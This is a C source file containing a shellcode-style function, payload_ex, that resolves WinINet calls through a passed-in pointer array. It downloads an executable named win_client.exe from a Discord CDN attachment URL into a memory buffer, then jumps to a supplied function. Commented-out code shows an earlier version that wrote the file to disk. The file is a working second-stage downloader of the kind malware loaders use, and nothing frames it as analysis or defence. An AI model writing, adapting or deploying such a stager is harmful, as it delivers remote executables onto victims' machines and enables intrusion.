// extern unsigned long long InternetOpen(unsigned short*, int, void*, void*,int);
// //hInternet = InternetOpenW(L"FileDownload", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
// extern unsigned long long InternetOpenUrlA (unsigned long long, char*, void*, int, int, int);
// //hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

// extern void* fopen(char*, char*);

// extern InternetReadFile(unsigned long long, unsigned char*, int, int*);
// /*
//     while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
//         fwrite(buffer, 1, bytesRead, outputFile);
//     }
// */

// extern void fclose(void*);

// extern int InternetCloseHandle(unsigned long long);

// extern int fwrite(unsigned char*, int, int, void*);

#define NULL ((void *)0)
typedef void* (*InterOpen)(unsigned short*, int, void*, void*,int);
typedef void* (*InterOpenUrlA)(void*, char*, void*, int, int, int);
typedef int (*InterReadFile)(void*, unsigned char*, int, int*);
typedef int (*fwrit)(unsigned char*, int, int, void*);
typedef int (*InterCloseHandle)(void*);
typedef int (*GetLastRror)(void);
typedef void(*finita)(void);

#define INTERNET_FLAG_RELOAD 0x80000000
/*
    args = {
        InternetOpen,
        InternetOpenUrlA,
        InternetReadFile,
        InternetCloseHandle,
        fwrite,
        FILE*,
    }
*/


void payload_ex(void** args){
    char url[] = "https://cdn.discordapp.com/attachments/762321594215038985/1166086220154146897/win_client.exe?ex=6549356b&is=6536c06b&hm=ab3edf49d3be8fd415240b11e1bf438494d8a0f8034b180c2d9f376bb94d6b71&";
    // char url[] = "http://ipv4.download.thinkbroadband.com/5MB.zip";
    unsigned short sFileDownload[] = L"FileDownload";
    InterOpen InternetOpen = args[0];
    InterOpenUrlA InternetOpenUrlA = args[1];
    InterReadFile InternetReadFile = args[2];
    InterCloseHandle InternetCloseHandle = args[3];
    // fwrit fwrite = args[4];
    // void* outputFile = args[5];
    unsigned char* ret_buf = args[4];
    int* ret_sz = args[5];
    finita stepOverExit = args[6];
    // GetLastRror GetLastError = args[6];
    char buffer[16];
    int bytesRead = 0;
    int ptr = 0;
    int* hInternet;
    int* hConnect;
    int failes = 100;
    hInternet = InternetOpen(sFileDownload, 1, NULL, NULL, 0);
    if (hInternet == NULL) {
        return;
    }

    // Open a connection to the URL
    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        // int c =  GetLastError();
        InternetCloseHandle(hInternet);
        return;
    }

    // Create and open a local file to save the downloaded data
    // Download and save the file
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        // fwrite(buffer, 1, bytesRead, outputFile);

        for (int i = 0; i < bytesRead; ++i){
            ret_buf[ptr++] = buffer[i];
            buffer[i] = 0;
        }
        bytesRead = 0;
        // if (ptr >= 56832){
        //     break;
        // }
    }
    // TODO Check hashsum of the downloaded file, in case of failure, use offline version
    *ret_sz = ptr;
    // printf("We got here\n");
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    stepOverExit();
    return;
}

